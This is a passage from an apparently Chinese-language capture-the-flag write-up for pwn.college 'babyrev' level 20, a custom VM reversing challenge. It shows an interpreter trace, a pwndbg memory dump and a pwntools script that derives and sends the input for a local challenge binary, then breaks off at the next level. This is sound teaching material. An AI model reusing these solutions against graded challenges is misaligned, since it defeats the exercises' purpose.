class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK a NONE<br>[<span class="hljs-meta">s</span>] ... popping a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x9d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x9d</span><br>[<span class="hljs-meta">s</span>] IMM i = <span class="hljs-number">0x9d</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x9e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x30</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x30</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x9f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0xa3</span><br>[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0xa3</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa0</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x15</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x15</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa1</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0x2</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x2</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa2</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x4</span><br>[<span class="hljs-meta">s</span>] ADD d i<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa3</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] STK NONE d<br>[<span class="hljs-meta">s</span>] ... pushing d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0xa4</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] IMM i = <span class="hljs-number">0x2</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x3</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD a c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x45</span> b:<span class="hljs-number">0xa3</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x4</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x45</span> b:<span class="hljs-number">0xb8</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xa4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x5</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0xff</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0xff</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x45</span> b:<span class="hljs-number">0xb8</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x6</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] ADD a d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb8</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x7</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] ADD b d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x8</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] STK NONE a<br>[<span class="hljs-meta">s</span>] ... pushing a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x9</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STK NONE b<br>[<span class="hljs-meta">s</span>] ... pushing b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xa</span> f:<span class="hljs-number">0</span><span class="hljs-meta">#######</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM a = *a<span class="hljs-meta"># a1[0x44]</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xb</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] LDM b = *b<span class="hljs-meta"># a1[0xb7]</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0x5b</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xc</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x8</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] CMP a b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0x5b</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0xd</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK b NONE<br>[<span class="hljs-meta">s</span>] ... popping b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x89</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0xe</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK a NONE<br>[<span class="hljs-meta">s</span>] ... popping a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0xff</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0xf</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x16</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0x16</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x16</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x10</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x10</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">j</span>] JMP N d<br>[<span class="hljs-meta">j</span>] ... TAKEN<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x16</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x17</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] STK d c<br>[<span class="hljs-meta">s</span>] ... pushing c<br>[<span class="hljs-meta">s</span>] ... popping d<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x18</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK i NONE<br>[<span class="hljs-meta">s</span>] ... popping i<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0x15</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa5</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa6</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x8</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] CMP d c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa7</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0xaa</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0xaa</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0xaa</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa8</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x10</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">j</span>] JMP E d<br>[<span class="hljs-meta">j</span>] ... NOT TAKEN<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0xaa</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xa9</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x1</span> arg2:<span class="hljs-number">0x18</span><br>[<span class="hljs-meta">s</span>] IMM d = <span class="hljs-number">0x18</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0xaa</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x10</span> arg1:<span class="hljs-number">0x12</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">j</span>] JMP LG d<br>[<span class="hljs-meta">j</span>] ... TAKEN<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xb7</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x19</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0xd4</span><br>[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0xd4</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xd4</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x1a</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xa</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xa</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xd4</span> c:<span class="hljs-number">0xa</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x1b</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x1</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xd4</span> c:<span class="hljs-number">0xa</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x1c</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x2</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] SYS <span class="hljs-number">0x2</span> d<br>[<span class="hljs-meta">s</span>] ... write<br></code></pre></td></tr></table></figure><p><code>rax+0x300</code>是<code>a1</code>首地址，那么可以读出目标字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x /<span class="hljs-number">21</span>bx $rax+<span class="hljs-number">0</span>xb7 + <span class="hljs-number">0</span>x300 -<span class="hljs-number">20</span><br><span class="hljs-attribute">0x7ffe834dd363</span>: <span class="hljs-number">0</span>x43    <span class="hljs-number">0</span>xed    <span class="hljs-number">0</span>xf2    <span class="hljs-number">0</span>x06    <span class="hljs-number">0</span>x74    <span class="hljs-number">0</span>x8f    <span class="hljs-number">0</span>xb8    <span class="hljs-number">0</span>x43<br><span class="hljs-attribute">0x7ffe834dd36b</span>: <span class="hljs-number">0</span>xd0    <span class="hljs-number">0</span>x49    <span class="hljs-number">0</span>xd5    <span class="hljs-number">0</span>x94    <span class="hljs-number">0</span>x09    <span class="hljs-number">0</span>x9d    <span class="hljs-number">0</span>x9b    <span class="hljs-number">0</span>xf0<br><span class="hljs-attribute">0x7ffe834dd373</span>: <span class="hljs-number">0</span>xa6    <span class="hljs-number">0</span>x6c    <span class="hljs-number">0</span>xe7    <span class="hljs-number">0</span>x62    <span class="hljs-number">0</span>x5b<br></code></pre></td></tr></table></figure><p>找到目标字符串，然后根据上述的vmcode能够找到对应的输入字符串，最后做一个减法即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-20-0&#x27;,&#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-20-0&quot;</span>)<br>al = [<span class="hljs-number">0x43</span>-<span class="hljs-number">0xa5</span>, <span class="hljs-number">0xed</span>-<span class="hljs-number">0xce</span>, <span class="hljs-number">0xf2</span>-<span class="hljs-number">0x67</span>, <span class="hljs-number">0x06</span>-<span class="hljs-number">0xab</span>, <span class="hljs-number">0x74</span>-<span class="hljs-number">0x98</span>, <span class="hljs-number">0x8f</span>-<span class="hljs-number">0x46</span>, <span class="hljs-number">0xb8</span>-<span class="hljs-number">0x63</span>, <span class="hljs-number">0x43</span>-<span class="hljs-number">0xe1</span>, <span class="hljs-number">0xd0</span>-<span class="hljs-number">0x48</span>,<span class="hljs-number">0x49</span>-<span class="hljs-number">0x37</span>, <span class="hljs-number">0xd5</span>-<span class="hljs-number">0x3e</span>, <span class="hljs-number">0x94</span>-<span class="hljs-number">0x7f</span>, <span class="hljs-number">0x09</span>-<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>-<span class="hljs-number">0xfa</span>, <span class="hljs-number">0x9b</span>-<span class="hljs-number">0x53</span>, <span class="hljs-number">0xf0</span>-<span class="hljs-number">0x5f</span>, <span class="hljs-number">0xa6</span>-<span class="hljs-number">0x99</span>, <span class="hljs-number">0x6c</span>-<span class="hljs-number">0x31</span>, <span class="hljs-number">0xe7</span>-<span class="hljs-number">0x38</span>, <span class="hljs-number">0x62</span>-<span class="hljs-number">0x8f</span>, <span class="hljs-number">0x5b</span> - <span class="hljs-number">0x89</span>]<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(al)):<br>    <span class="hljs-comment"># print(al[i])</span><br>    payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, (al[i]) % <span class="hljs-number">256</span>)<br><span class="hljs-comment"># payload = struct.pack(&#x27;21B&#x27;, *al)</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br>z = p.readline()<br><span class="hljs-keyword">while</span>(z):<br>    <span class="hljs-built_in">print</span>(z)<br>    z = p.readline()<br></code></pre></td></tr></table></figure><h4 id="level20-1"><a href="#level20-1" class="headerlink" title="level20.1"></a>level20.1</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span 